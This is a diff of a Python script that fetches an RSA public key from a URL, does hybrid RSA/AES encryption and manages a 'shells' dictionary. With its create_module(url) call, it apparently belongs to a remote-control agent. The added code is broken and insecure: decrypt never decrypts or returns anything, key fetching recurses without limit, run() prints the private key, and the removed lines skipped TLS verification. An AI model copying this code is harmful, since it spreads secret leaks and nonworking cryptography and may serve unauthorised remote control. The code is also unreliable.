@@ -25,7 +25,7 @@ from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_paddi
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 
-def get_public_key(url, private_key):
+def get_public_key(url):
     """
     This function fetches the public RSA key from a URL that returns the PEM file.
     The public key is used to encrypt the AES key for secure message transmission.
@@ -47,23 +47,23 @@ def get_public_key(url, private_key):
         # Return the loaded RSA public key
         return serialization.load_pem_public_key(clean_key_bytes)
     except:
-        time.sleep(5)
+        return get_public_key(url)
 
-        context = ssl._create_unverified_context()
-        with urlopen(url, context=context) as response:
-            key_bytes = response.read()  # Read the data as raw bytes
+def decrypt(private_key, encrypted_data):
+    # Step 1: Separate the encrypted AES key, IV, and ciphertext
+    encrypted_aes_key = encrypted_data[:256]  # RSA-encrypted AES key (2048 bits = 256 bytes)
+    iv = encrypted_data[256:272]  # The IV is 16 bytes long
+    ciphertext = encrypted_data[272:]  # The rest is the AES-encrypted message
 
-        # Decode the byte data to a string and clean it up
-        key_str = key_bytes.decode('utf-8').strip()  # Decode to string and strip any excess whitespace or newlines
-
-        # Replace literal '\n' with actual line breaks
-        key_str = key_str.replace(r'\n', '\n').replace("b'", "").replace("'", "")  # Ensure that literal '\n' is converted to actual newline characters
-
-        # Convert the cleaned-up string back to bytes
-        clean_key_bytes = key_str.encode('utf-8')  # Re-encode the cleaned string to bytes
-
-        # Return the loaded RSA public key
-        return serialization.load_pem_public_key(clean_key_bytes)
+    # Step 2: Decrypt the AES key using RSA (private key)
+    aes_key = private_key.decrypt(
+        encrypted_aes_key,
+        asym_padding.OAEP(
+            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
 
 def encrypt(public_key, message):
     """
@@ -117,7 +117,8 @@ shells = {}
 
 INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes timeout in seconds
 
-def run(data):
+def run(data, private_key):
+    print(private_key)
     public_key = get_public_key(data['url']+"key")
 
     def create_module(url):
